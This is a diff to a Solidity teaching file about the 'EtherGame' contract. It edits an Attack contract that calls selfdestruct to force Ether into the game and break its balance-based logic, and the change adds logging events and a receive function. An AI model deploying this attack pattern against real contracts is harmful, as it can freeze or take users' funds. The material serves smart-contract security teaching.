@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.0;
 
 // The goal of this game is to be the 7th player to deposit 1 Ether.
 // Players can deposit only 1 Ether at a time.
@@ -53,6 +53,14 @@ contract Attack {
 
         // cast address to payable
         address payable addr = payable(address(etherGame));
+        emit SelfDestruct();
         selfdestruct(addr);
+    }
+
+    event SelfDestruct();
+    event Received(address, uint);
+
+    receive() external payable {
+        emit Received(msg.sender, msg.value);
     }
 }
